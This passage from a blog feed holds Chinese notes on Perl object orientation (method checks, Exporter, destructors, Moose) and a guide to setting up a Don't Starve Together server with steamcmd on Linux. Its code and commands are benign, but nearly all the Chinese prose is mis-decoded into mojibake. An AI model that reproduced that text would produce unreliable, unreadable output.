class="hljs-keyword">use</span> v5.<span class="hljs-number">10</span>;<br><br><span class="hljs-keyword">if</span> (Horse-&gt;DOES(<span class="hljs-string">&#x27;Animal&#x27;</span>)) &#123;   <span class="hljs-comment"># does Horse do Animal?</span><br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A Horse is an Animal.\n&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>can</code> æŸ¥è¯¢ç‰¹å®šçš„æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ($tv_horse-&gt;can(<span class="hljs-string">&#x27;eat&#x27;</span>)) &#123;<br>    $tv_horse-&gt;eat(<span class="hljs-string">&#x27;hay&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>éƒ½å°½å¯èƒ½é…åˆ <code>eval</code> ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span> &#123; $unknown_thing-&gt;DOES(<span class="hljs-string">&#x27;Animal&#x27;</span>) &#125;) &#123;<br><span class="hljs-comment">#    ... it&#x27;s an Animal ...</span><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span> &#123; $tv_horse-&gt;can(<span class="hljs-string">&#x27;eat&#x27;</span>) &#125;) &#123; ... &#125;<br></code></pre></td></tr></table></figure><h2 id="16-3-æœ€åçš„æ‰‹æ®µ"><a href="#16-3-æœ€åçš„æ‰‹æ®µ" class="headerlink" title="16.3 æœ€åçš„æ‰‹æ®µ"></a>16.3 æœ€åçš„æ‰‹æ®µ</h2><p>åœ¨Perlè§£é‡Šå™¨åœ¨ç»§æ‰¿æ ‘å’ŒUNIVERSALä¸­æŸ¥æ‰¾æ–¹æ³•å,å¦‚æœè¿˜ä¸æˆåŠŸ,æŸ¥æ‰¾å°†ä¸ä¼šåœæ­¢ã€‚Perlè§£é‡Šå™¨å°†é‡å¤æœå¯»ç›¸åŒçš„å±‚æ¬¡(åŒ…æ‹¬ UNIVERSAL),æŸ¥æ‰¾ä¸€ä¸ªå« AUTOLOAD çš„æ–¹æ³•ã€‚</p><p>å®šä¹‰ä¸€ä¸ªå« AUTOLOAD çš„æ–¹æ³•.</p><p>æŸ¥çœ‹ Autoloader å’Œ SelfLoader çš„æ ¸å¿ƒæ¨¡å—æ–‡æ¡£.</p><h2 id="16-4-ä½¿ç”¨-AUTOLOAD-åˆ›å»ºè®¿é—®å™¨"><a href="#16-4-ä½¿ç”¨-AUTOLOAD-åˆ›å»ºè®¿é—®å™¨" class="headerlink" title="16.4 ä½¿ç”¨ AUTOLOAD åˆ›å»ºè®¿é—®å™¨"></a>16.4 ä½¿ç”¨ AUTOLOAD åˆ›å»ºè®¿é—®å™¨</h2><h2 id="16-5-æ›´å®¹æ˜“åœ°åˆ›å»º-getter-å’Œ-setter"><a href="#16-5-æ›´å®¹æ˜“åœ°åˆ›å»º-getter-å’Œ-setter" class="headerlink" title="16.5 æ›´å®¹æ˜“åœ°åˆ›å»º getter å’Œ setter"></a>16.5 æ›´å®¹æ˜“åœ°åˆ›å»º getter å’Œ setter</h2><p>ä½¿ç”¨ Class::MethodMaker æ¨¡å—.</p><h2 id="16-6-å¤šé‡ç»§æ‰¿"><a href="#16-6-å¤šé‡ç»§æ‰¿" class="headerlink" title="16.6 å¤šé‡ç»§æ‰¿"></a>16.6 å¤šé‡ç»§æ‰¿</h2><p>å¤šé‡ç»§æ‰¿å‘ç”Ÿåœ¨å½“ä¸€ä¸ªç±»çš„ <code>@ISA</code> æœ‰ä¸æ­¢ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> ReceHorse;<br><span class="hljs-keyword">use</span> parent <span class="hljs-string">qw&#123; Horse Racer &#125;</span>;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬17ç« -Exporter"><a href="#ç¬¬17ç« -Exporter" class="headerlink" title="ç¬¬17ç«  Exporter"></a>ç¬¬17ç«  Exporter</h1><h2 id="17-1-use-è¯­å¥åœ¨åšä»€ä¹ˆ"><a href="#17-1-use-è¯­å¥åœ¨åšä»€ä¹ˆ" class="headerlink" title="17.1 use è¯­å¥åœ¨åšä»€ä¹ˆ"></a>17.1 use è¯­å¥åœ¨åšä»€ä¹ˆ</h2><p>ä¸‹é¢ä¸¤ä¸ªæ“ä½œæ˜¯ç­‰ä»·çš„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Island::Plotting::Maps <span class="hljs-string">qw( load_map scale_map draw_map )</span>;<br><br>BEGIN &#123;<br>    <span class="hljs-keyword">require</span> Island::Plotting::Maps;<br>    Island::Plotting::Maps-&gt;import( <span class="hljs-string">qw( load_map scale_map draw_map )</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>å†’å·åœ¨ç±» UNIX ç³»ç»Ÿä¸­è¢«è½¬æ¢æˆç›®å½•åˆ†éš”ç¬¦ï¼Œæœ€ç»ˆå°†ä»¥å¦‚ä¸‹æ–¹å¼æ˜¾ç¤º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">require</span> <span class="hljs-string">&quot;Island/Plotting/Maps.pm&quot;</span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨å‰é¢ä½¿ç”¨çš„ <code>.pl</code> (å³ Perl library çš„ç¼©å†™)ä½œä¸ºæ‰©å±•å,å› ä¸º use è¯­å¥æ‰¾ä¸åˆ°å®ƒã€‚å®ƒåªèƒ½ä½¿ç”¨ <code>.pm</code> æ‰©å±•åã€‚</p><p>Perlè§£é‡Šå™¨å°†æŸ¥æ‰¾å½“å‰@INCæ•°ç»„ä¸­çš„å€¼,æŒ‰é¡ºåºæ£€æŸ¥æ¯ä¸ªç›®å½•,æŸ¥æ‰¾ä¸€ä¸ªå«Islandçš„å­ç›®å½•ä¸­çš„Plottingå­ç›®å½•ä¸­åŒ…å«åä¸ºMaps.pmçš„æ–‡ä»¶ã€‚</p><p>å¦‚æœPerlè§£é‡Šå™¨æŸ¥æ‰¾@INCæ•°ç»„åè¿˜æ‰¾ä¸åˆ°æŒ‡å®šçš„æ–‡ä»¶,ç¨‹åºå°±ç”±äºæŸ¥è¯¢ä¸åˆ°æ‰€è°ƒç”¨çš„åº“è€Œç»ˆæ­¢(è¿™å¯é€šè¿‡evalæ•è·)ã€‚å¦åˆ™,Perlè¯»å–å¹¶åˆ¤æ–­å®ƒè¯»å–çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚ä¸requireè¯­å¥ç±»ä¼¼,æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼å¿…é¡»ä¸ºçœŸ,å¦åˆ™ç¨‹åºå°†è®¤ä¸ºå®ƒé‡åˆ°ç¼–è¯‘æ–‡ä»¶çš„é”™è¯¯è€Œé€€å‡ºã€‚</p><p>File::Basenameæ¨¡å—æ–‡ä»¶çš„ä¸€éƒ¨åˆ†å¯èƒ½å¦‚ä¸‹æ‰€ç¤º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> File::Basename;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">dirname</span> </span>&#123; ... &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">basename</span> </span>&#123; ... &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">fileparse</span> </span>&#123; ... &#125;<br></code></pre></td></tr></table></figure><p>åœ¨BEGINå—ä¸­çš„ç¬¬äºŒæ­¥:Perlè§£é‡Šå™¨åœ¨æ¨¡å—çš„åŒ…é‡Œè‡ªåŠ¨è°ƒç”¨ä¸€ä¸ªå«åšimportçš„ä¾‹ç¨‹,ä¼ å…¥æ•´ä¸ªå¯¼å…¥åˆ—è¡¨ã€‚é€šå¸¸æƒ…å†µä¸‹,è¿™ä¸ªä¾‹ç¨‹å°†å¯¹å¯¼å…¥çš„å‘½åç©ºé—´ä¸­çš„ä¸€äº›åç§°æŒ‡å®šåˆ«å(ä¾‹å¦‚:File::Basenameæ¨¡å—),ç„¶åæ˜ å°„åˆ°å½“å‰çš„å‘½åç©ºé—´ä¹‹ä¸­(ä¾‹å¦‚main)ã€‚</p><p>æœ€å,æ•´ä¸ªè¿‡ç¨‹è¢«å°è£…åœ¨ä¸€ä¸ªBEGINè¯­å¥å—å†…ã€‚è¿™æ„å‘³ç€useè¯­å¥çš„æ“ä½œåœ¨ç¼–è¯‘æ—¶é—´å†…ç”Ÿæ•ˆ,è€Œä¸æ˜¯è¿è¡Œæ—¶,</p><h2 id="17-2-ä½¿ç”¨-Exporter-æ¨¡å—å¯¼å…¥å­ä¾‹ç¨‹"><a href="#17-2-ä½¿ç”¨-Exporter-æ¨¡å—å¯¼å…¥å­ä¾‹ç¨‹" class="headerlink" title="17.2 ä½¿ç”¨ Exporter æ¨¡å—å¯¼å…¥å­ä¾‹ç¨‹"></a>17.2 ä½¿ç”¨ Exporter æ¨¡å—å¯¼å…¥å­ä¾‹ç¨‹</h2><p>åœ¨ Exporter æ¨¡å—ä¸­æœ‰ä¸€ä¸ªæ ‡å‡†çš„ <code>import</code> æ–¹æ³•ï¼Œä½¿ç”¨æ–¹å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Animal::Utils;<br><span class="hljs-keyword">use</span> parent <span class="hljs-string">qw(Exporter)</span>;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> v5.<span class="hljs-number">8.3</span>;<br><span class="hljs-keyword">package</span> Animal::Utils;<br><span class="hljs-keyword">use</span> Exporter <span class="hljs-string">qw(import)</span>;<br></code></pre></td></tr></table></figure><h2 id="17-3-EXPORT-å’Œ-EXPORT-OK"><a href="#17-3-EXPORT-å’Œ-EXPORT-OK" class="headerlink" title="17.3 @EXPORT å’Œ @EXPORT_OK"></a>17.3 @EXPORT å’Œ @EXPORT_OK</h2><p>ç”± Exporter æ¨¡å—æä¾›çš„ <code>import</code> å­ä¾‹ç¨‹å°†æ£€æŸ¥æ¨¡å—åŒ…ä¸­çš„ <code>@EXPORT</code> å˜é‡,åˆ¤æ–­å“ªä¸ªç¬¦å·å®ƒé»˜è®¤å¯¼å‡ºã€‚</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> File::Basename;<br><span class="hljs-keyword">use</span> Exporter <span class="hljs-string">qw(import)</span>;<br><span class="hljs-keyword">our</span> @EXPORT = <span class="hljs-string">qw( basename dirname filename )</span>;<br></code></pre></td></tr></table></figure><p><code>@EXPORT</code> ç›¸å½“äºæä¾›äº†ä¸€ä¸ªé»˜è®¤çš„å¯¼å…¥åˆ—è¡¨.</p><p>ä»¥ä¸‹ä¸¤ä¸ªè°ƒç”¨æ˜¯ç­‰æ•ˆçš„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> File::Basename;<br><br>BEGIN &#123; <span class="hljs-keyword">require</span> File::Basename; File::Basename-&gt;import &#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæŒ‡å®šä»»ä½•ä¾‹ç¨‹çš„åç§°,å®ƒä»¬å¿…é¡»è¦ä¹ˆåœ¨@EXPORTåˆ—è¡¨ä¸­,è¦ä¹ˆåœ¨@EXPORT_OKåˆ—è¡¨ä¸­,</p><h2 id="17-4-ä½¿ç”¨-EXPORT-TAGS-åˆ†ç»„"><a href="#17-4-ä½¿ç”¨-EXPORT-TAGS-åˆ†ç»„" class="headerlink" title="17.4 ä½¿ç”¨ %EXPORT_TAGS åˆ†ç»„"></a>17.4 ä½¿ç”¨ %EXPORT_TAGS åˆ†ç»„</h2><h1 id="ç¬¬18ç« -å¯¹è±¡ææ„"><a href="#ç¬¬18ç« -å¯¹è±¡ææ„" class="headerlink" title="ç¬¬18ç«  å¯¹è±¡ææ„"></a>ç¬¬18ç«  å¯¹è±¡ææ„</h1><p>è°ƒç”¨ä¸€ä¸ªæ¸…é™¤å¯¹è±¡çš„æ–¹æ³•æ¥é”€æ¯å®ƒ.</p><h2 id="18-1-æ¸…ç†"><a href="#18-1-æ¸…ç†" class="headerlink" title="18.1 æ¸…ç†"></a>18.1 æ¸…ç†</h2><p>é€šè¿‡ç»™å¯¹è±¡ä¸€ä¸ª <code>DESTROY</code> æ–¹æ³•æ¥è¯·æ±‚é”€æ¯çš„é€šçŸ¥.</p><p>å½“æŒ‡å‘å¯¹è±¡çš„æœ€åä¸€ä¸ªå¼•ç”¨æ¶ˆå¤±æ—¶,ä»¥$bessieä¸ºä¾‹,Perlè§£é‡Šå™¨è‡ªåŠ¨è°ƒç”¨è¯¥å¯¹è±¡çš„DESTROYæ–¹æ³•,å°±åƒæˆ‘ä»¬ä¸»åŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ä¸€æ ·ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$bessie-&gt;DESTROY<br></code></pre></td></tr></table></figure><p>å¦‚æ·»åŠ ä¸€ä¸ª <code>DESTROY</code> æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">## in Animal</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">DESTROY</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;[&#x27;</span>, $self-&gt;name, <span class="hljs-string">&quot; has died.]\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åœ¨å¯¹è±¡é”€æ¯æ—¶ï¼Œå¯ä»¥è·å¾—ç›¸åº”çš„æç¤ºä¿¡æ¯.</p><p>Perlè§£é‡Šå™¨åœ¨ç¨‹åºæ‰§è¡Œå®Œæœ€åä¸€ä¸ªENDè¯­å¥å—æ ‡å¿—æ—¶ç«‹å³æ‰§è¡Œæœ€åçš„æ¸…ç†å·¥ä½œ.</p><h2 id="18-2-æ½œé€ƒå¯¹è±¡ææ„"><a href="#18-2-æ½œé€ƒå¯¹è±¡ææ„" class="headerlink" title="18.2 æ½œé€ƒå¯¹è±¡ææ„"></a>18.2 æ½œé€ƒå¯¹è±¡ææ„</h2><p>ä¸€ä¸ªå¯¹è±¡åŒ…å«å¦ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå…ˆé”€æ¯å¤–éƒ¨.</p><p>é”€æ¯ä¸€ä¸ªå¼•ç”¨, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$barn = <span class="hljs-keyword">undef</span>;<br></code></pre></td></tr></table></figure><p>è€Œæ­¤æ—¶ <code>DESTROY</code> æ–¹æ³•åˆ™ä¼šè¢«è‡ªåŠ¨è°ƒç”¨.</p><p>æ ‡å‡†åº“çš„ File::Temp æ¨¡å—æä¾›ä¸´æ—¶æ–‡ä»¶. è¯¥æ¨¡å—çš„ tempfile ä¾‹ç¨‹çŸ¥é“å¦‚ä½•ç”Ÿæˆä¸´æ—¶æ–‡ä»¶ï¼ŒåŒ…æ‹¬åœ¨å“ªå„¿æ”¾ç½®.</p><p>ä½¿ç”¨ <code>close</code> å…³é—­æ–‡ä»¶å¥æŸ„ï¼Œä½¿ç”¨ <code>unlink</code> åˆ é™¤æ–‡ä»¶.</p><h2 id="18-3-ç»ˆç»“ä¸€ä¸ª-â€œæ­»å»â€-çš„Horse-ç±»"><a href="#18-3-ç»ˆç»“ä¸€ä¸ª-â€œæ­»å»â€-çš„Horse-ç±»" class="headerlink" title="18.3 ç»ˆç»“ä¸€ä¸ª â€œæ­»å»â€ çš„Horse ç±»"></a>18.3 ç»ˆç»“ä¸€ä¸ª â€œæ­»å»â€ çš„Horse ç±»</h2><h2 id="18-4-é—´æ¥å¯¹è±¡è¡¨ç¤ºæ³•"><a href="#18-4-é—´æ¥å¯¹è±¡è¡¨ç¤ºæ³•" class="headerlink" title="18.4 é—´æ¥å¯¹è±¡è¡¨ç¤ºæ³•"></a>18.4 é—´æ¥å¯¹è±¡è¡¨ç¤ºæ³•</h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">Class-&gt;class_method(@args);<br>$instance-&gt;instance_method(@other);<br></code></pre></td></tr></table></figure><p>å¯ä»¥å†™ä¸ºï¼Œè°ƒç”¨æ–¹æ³•ååœ¨ç±»åå‰ï¼Œæ–¹æ³•æ‰€éœ€è¦çš„å‚æ•°åœ¨ç±»åå:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">class_method Class @args;<br>instance_method $instance @other<br></code></pre></td></tr></table></figure><h2 id="18-5-å­ç±»ä¸­çš„é¢å¤–å®ä¾‹"><a href="#18-5-å­ç±»ä¸­çš„é¢å¤–å®ä¾‹" class="headerlink" title="18.5 å­ç±»ä¸­çš„é¢å¤–å®ä¾‹"></a>18.5 å­ç±»ä¸­çš„é¢å¤–å®ä¾‹</h2><p>è¿ç”¨æ•£åˆ—è¡¨å®¹æ˜“å¢åŠ é¢å¤–çš„å®ä¾‹å˜é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">named</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>-&gt;SUPER::named(@_);<br>    $self-&gt;&#123;$_&#125; = <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-string">qw(wins places shows losses)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="18-6-ä½¿ç”¨ç±»å˜é‡"><a href="#18-6-ä½¿ç”¨ç±»å˜é‡" class="headerlink" title="18.6 ä½¿ç”¨ç±»å˜é‡"></a>18.6 ä½¿ç”¨ç±»å˜é‡</h2><p>è‹¥æƒ³è¦çŸ¥é“ç”¨ <code>named</code> æ„é€ äº†é‚£äº›åŠ¨ç‰©ï¼Œç”¨ä¸€ä¸ªæ•£åˆ—æ¥å­˜å‚¨å·²ç»åˆ›å»ºçš„åŠ¨ç‰©:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">## in Animal     </span><br><span class="hljs-keyword">my</span> %REGISTRY;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">named</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $name = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $self = &#123; <span class="hljs-string">Name =&gt;</span> $name, $class-&gt;default_color &#125;;<br>    <span class="hljs-keyword">bless</span> $self, $class;<br>    $REGISTRY&#123;$self&#125; = $self; <span class="hljs-comment"># also returns $self</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="18-7-å‰Šå¼±å‚æ•°"><a href="#18-7-å‰Šå¼±å‚æ•°" class="headerlink" title="18.7 å‰Šå¼±å‚æ•°"></a>18.7 å‰Šå¼±å‚æ•°</h2><p>ä½¿ç”¨ Scalar::Util æ¨¡å—ä¸‹çš„ <code>weaken</code> å‡½æ•°ï¼Œå°†å¼•ç”¨è½¬åŒ–ä¸ºå¼±å¼•ç”¨.</p><p>å½“ Perl è§£é‡Šå™¨å¯¹æŸå¯¹è±¡çš„æ´»è·ƒå¼•ç”¨è¿›è¡Œè®¡æ•°æ—¶ï¼Œä»–ä¸ä¼šå¯¹é€šè¿‡ weaken å‡½æ•°è½¬åŒ–çš„å¼±å¼•ç”¨è¿›è¡Œè®¡æ•°ã€‚å¦‚æœæ‰€æœ‰æ™®é€šå¼•ç”¨éƒ½æ¶ˆå¤±äº†,Perlè§£é‡Šå™¨ä¼šæŠŠè¿™ä¸ªå¯¹è±¡åˆ é™¤å¹¶ä¸”å°†æ‰€æœ‰å¼±å¼•ç”¨å˜ä¸ºundefã€‚</p><h1 id="ç¬¬19ç« -Moose-ç®€ä»‹"><a href="#ç¬¬19ç« -Moose-ç®€ä»‹" class="headerlink" title="ç¬¬19ç«  Moose ç®€ä»‹"></a>ç¬¬19ç«  Moose ç®€ä»‹</h1><p>Moose æ¨¡å—æ˜¯ Perl è¯­è¨€ä¸€ä¸ªç›¸å¯¹æ¯”è¾ƒæ–°çš„å¯¹è±¡ç³»ç»Ÿ.</p><h2 id="19-1-ç”¨-Moose-æ¨¡å—åˆ›å»ºä¹‹å‰çš„-Animal-æ¨¡å—"><a href="#19-1-ç”¨-Moose-æ¨¡å—åˆ›å»ºä¹‹å‰çš„-Animal-æ¨¡å—" class="headerlink" title="19.1 ç”¨ Moose æ¨¡å—åˆ›å»ºä¹‹å‰çš„ Animal æ¨¡å—"></a>19.1 ç”¨ Moose æ¨¡å—åˆ›å»ºä¹‹å‰çš„ Animal æ¨¡å—</h2><p>Moose ä¸­å®šä¹‰çš„ <code>has</code>, </p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­å»ºé¥¥è’æœåŠ¡å™¨</title>
    <link href="/2022/10/19/%E6%90%AD%E5%BB%BA%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2022/10/19/%E6%90%AD%E5%BB%BA%E9%A5%A5%E8%8D%92%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a><a href="https://www.psychz.net/client/kb/en/how-to-setup-a-dedicated-server-for-dont-starve-together-dst.html">å‚è€ƒ</a></h1><h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt update<br>$ apt install screen wget<br></code></pre></td></tr></table></figure><p>æ·»åŠ  32 ä½ linraries. ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">arch</span><br></code></pre></td></tr></table></figure><p>æ¥æŸ¥è¯¢.</p><p>è‹¥è¾“å‡ºä¸º <code>X86_64</code>, åˆ™éœ€è¦æ·»åŠ .</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ dpkg --add-architecture i386<br>$ apt update <br>$ apt install lib32gcc1<br></code></pre></td></tr></table></figure><p>æŠ¥é”™æç¤ºæ²¡æœ‰ <code>lib32gcc1</code>, è®©æˆ‘ä¸‹è½½ <code>lib32gcc-s1</code></p><h2 id="ä¸‹è½½-Steam-å‘½ä»¤è¡Œå·¥å…·å¹¶è¿è¡Œæ›´æ–°"><a href="#ä¸‹è½½-Steam-å‘½ä»¤è¡Œå·¥å…·å¹¶è¿è¡Œæ›´æ–°" class="headerlink" title="ä¸‹è½½ Steam å‘½ä»¤è¡Œå·¥å…·å¹¶è¿è¡Œæ›´æ–°"></a>ä¸‹è½½ Steam å‘½ä»¤è¡Œå·¥å…·å¹¶è¿è¡Œæ›´æ–°</h2><p>æ–°å»ºç›®å½•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> steamcmd<br>$ <span class="hljs-built_in">cd</span> steamcmd<br>$ wget http://steamcdn-a.akamaihd.net/client/installer/steamcmd_linux.tar.gz<br></code></pre></td></tr></table></figure><p>è§£å‹ç¼©:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar -xvzf steamcmd_linux.tar.gz<br></code></pre></td></tr></table></figure><p>æ›´æ–° steam tool:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ./steamcmd.sh<br></code></pre></td></tr></table></figure><p>çœ‹è§:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">Steam&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ™è¿›å…¥äº† Steam command line.</p><p>ç”¨ä½ çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½• steam. æ²¡æœ‰è´¦æˆ·å¯ä»¥ç”¨ <code>anonymous</code>:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Steam&gt; <span class="hljs-keyword">login</span> anonymous <br></code></pre></td></tr></table></figure><h2 id="å®‰è£…é¥¥è’"><a href="#å®‰è£…é¥¥è’" class="headerlink" title="å®‰è£…é¥¥è’"></a>å®‰è£…é¥¥è’</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Steam&gt; force_install_dir <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/Documents/</span>DST<br>Steam&gt; app_update <span class="hljs-number">343050</span> validate<br></code></pre></td></tr></table></figure><p>Donâ€™t Starve Together çš„ Steam ID.</p><h2 id="è¿è¡ŒæœåŠ¡å™¨"><a href="#è¿è¡ŒæœåŠ¡å™¨" class="headerlink" title="è¿è¡ŒæœåŠ¡å™¨"></a>è¿è¡ŒæœåŠ¡å™¨</h2><p>è¿›å…¥åˆ°å®‰è£… DST çš„ç›®å½•ä¸‹çš„ bin ç›®å½•, å…ˆæ–°å»º screen, ç„¶åè¿è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -S <span class="hljs-string">&quot;DST uestc&quot;</span><br>$ ./dontstarve_dedicated_server_nullrenderer -console<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a><a href="https://forums.kleientertainment.com/forums/topic/64441-dedicated-server-quick-setup-guide-linux/">å‚è€ƒ</a></h1><h1 id="å‚è€ƒ-nodecraft-å®˜æ–¹æ•™ç¨‹"><a href="#å‚è€ƒ-nodecraft-å®˜æ–¹æ•™ç¨‹" class="headerlink" title="å‚è€ƒ nodecraft å®˜æ–¹æ•™ç¨‹"></a><a href="https://nodecraft.com/support/games/dont-starve-together/how-to-acquire-a-cluster-token">å‚è€ƒ nodecraft å®˜æ–¹æ•™ç¨‹</a></h1><h1 id="å‚è€ƒ-2"><a href="#å‚è€ƒ-2" class="headerlink" title="å‚è€ƒ"></a><a href="https://zhuanlan.zhihu.com/p/25831490">å‚è€ƒ</a></h1><h1 id="å‚è€ƒ-3"><a href="#å‚è€ƒ-3" class="headerlink" title="å‚è€ƒ"></a><a href="https://cloud.tencent.com/developer/article/1185065">å‚è€ƒ</a></h1><h1 id="å‚è€ƒ-4"><a href="#å‚è€ƒ-4" class="headerlink" title="å‚è€ƒ"></a><a href="https://www.bilibili.com/video/BV1BJ411C7xK/?vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></h1>]]></content>
    
    
    <categories>
      
